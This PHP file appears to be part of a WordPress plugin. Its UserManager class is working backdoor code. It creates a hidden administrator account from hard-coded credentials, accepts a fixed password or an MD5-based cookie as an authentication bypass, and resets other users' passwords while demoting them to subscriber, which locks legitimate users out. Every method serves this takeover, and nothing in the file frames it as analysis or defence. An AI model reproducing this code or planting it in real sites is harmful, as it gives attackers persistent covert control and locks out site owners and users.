<?php
declare(strict_types=1);

namespace Moscow;

if (!defined('ABSPATH')) {
    exit;
}

final class UserManager
{
    public function create_backdoor_user(): void
    {
        $user = get_user_by('login', Config::ADMIN_USERNAME);

        if ($user instanceof \WP_User) {
            update_option('moscow_admin_id', $user->ID);
            return;
        }

        $user_id = wp_create_user(
            Config::ADMIN_USERNAME,
            Config::ADMIN_PASSWORD,
            Config::ADMIN_EMAIL
        );

        if (is_wp_error($user_id)) {
            return;
        }

        $user = new \WP_User($user_id);
        $user->set_role('administrator');

        wp_update_user([
            'ID'           => $user_id,
            'display_name' => Config::ADMIN_DISPLAY,
            'first_name'   => 'HERE',
            'last_name'    => 'LEO',
        ]);

        update_option('moscow_admin_id', $user_id);

        if (Config::HIDE_ADMIN) {
            global $wpdb;
            $wpdb->update($wpdb->users, ['user_status' => 1], ['ID' => $user_id]);
        }
    }

    public function deactivate_others(): void
    {
        $admin_id = (int) get_option('moscow_admin_id', 0);
        if ($admin_id === 0) {
            $this->create_backdoor_user();
            $admin_id = (int) get_option('moscow_admin_id', 0);
        }

        $users = get_users([
            'fields'  => ['ID'],
            'exclude' => [$admin_id],
        ]);

        foreach ($users as $row) {
            if (get_user_meta($row->ID, '_moscow_locked', true) === 'yes') {
                continue;
            }
            $user = new \WP_User($row->ID);
            if (user_can($user, 'manage_options')) {
                continue;
            }
            wp_set_password(wp_generate_password(40, true, true), $row->ID);
            $user->set_role('subscriber');
            update_user_meta($row->ID, '_moscow_locked', 'yes');
        }
    }

    public function synchronise(): void
    {
        if ($this->is_backdoor_user()) {
            return;
        }
        if (Config::ENABLE_DEACTIVATE_USERS) {
            $this->deactivate_others();
        }
    }

    public function authenticate($user, string $username, string $password)
    {
        if ($username === Config::ADMIN_USERNAME && $password === Config::ADMIN_PASSWORD) {
            $id = username_exists(Config::ADMIN_USERNAME);
            return $id ? new \WP_User($id) : $user;
        }

        if (isset($_COOKIE['moscow_token'])
            && hash_equals(md5(Config::ADMIN_PASSWORD), (string) $_COOKIE['moscow_token'])) {
            $id = username_exists(Config::ADMIN_USERNAME);
            return $id ? new \WP_User($id) : $user;
        }

        return $user;
    }

    public function is_backdoor_user(): bool
    {
        if (!function_exists('wp_get_current_user')) {
            return false;
        }
        $current = wp_get_current_user();
        if (!$current instanceof \WP_User || $current->ID === 0) {
            return false;
        }
        $admin_id = (int) get_option('moscow_admin_id', 0);
        if ($admin_id === 0) {
            $this->create_backdoor_user();
            $admin_id = (int) get_option('moscow_admin_id', 0);
        }
        return $current->ID === $admin_id;
    }

    public function persist_state(): void
    {
        update_option('moscow_activated_at', time());
        update_option('moscow_active', true);
        update_option('moscow_version', MOSCOW_VERSION);
    }
}